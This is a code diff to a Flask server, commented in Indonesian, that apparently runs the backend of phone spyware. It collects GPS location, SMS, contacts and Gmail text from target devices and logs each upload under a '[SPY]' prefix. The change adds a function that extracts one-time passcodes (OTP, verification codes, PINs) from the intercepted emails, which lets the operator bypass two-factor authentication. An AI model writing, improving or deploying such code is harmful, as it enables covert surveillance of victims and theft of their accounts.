@@ -15,6 +15,21 @@ latest_results = {"hp_target_1": {"gps": "Belum ada data", "sms": [], "contacts"
 UPLOAD_FOLDER = os.path.join(app.root_path, 'static', 'uploads')
 os.makedirs(UPLOAD_FOLDER, exist_ok=True)
 
+# Fungsi buat nge-filter OTP yang pinter
+def ekstrak_otp(teks):
+    # Cari pola umum OTP (kode, otp, verifikasi, sandi) diikuti 4-6 digit
+    pola_kontekstual = r'(?i)(?:otp|kode|verifikasi|code|sandi|pin)[\s:]*(\d{4,6})'
+    match = re.search(pola_kontekstual, teks)
+    if match: return match.group(1)
+    
+    # Fallback: Cari angka 4-6 digit, TAPI bukan tahun (19xx atau 20xx)
+    semua_angka = re.findall(r'\b\d{4,6}\b', teks)
+    for angka in semua_angka:
+        if not (angka.startswith('19') or angka.startswith('20')):
+            return angka
+            
+    return ""
+
 @app.route('/login', methods=['GET', 'POST'])
 def login():
     if request.method == 'POST':
@@ -64,16 +79,14 @@ def upload_result(device_id):
         elif tipe == "contacts": latest_results[device_id]["contacts"] = data.get("data")
         elif tipe == "gmail":
             text = data.get("data", "")
-            # Cari OTP (4-6 digit angka)
-            otp = re.search(r'\b\d{4,6}\b', text)
+            otp_code = ekstrak_otp(text)
             
-            # Simpan data gmail (max 3)
-            gmail_entry = {"text": text, "otp": otp.group(0) if otp else ""}
+            gmail_entry = {"text": text, "otp": otp_code}
             gmail_list = latest_results[device_id]["gmail"]
             gmail_list.insert(0, gmail_entry)
             if len(gmail_list) > 3: gmail_list.pop()
             
-            print(f"[SPY] Gmail masuk. OTP: {otp.group(0) if otp else 'Tidak ada'}")
+            print(f"[SPY] Gmail masuk. OTP: {otp_code if otp_code else 'Tidak ada'}")
     return jsonify({"status": "success"})
 
 @app.route('/api/upload_notification/<device_id>', methods=['POST'])
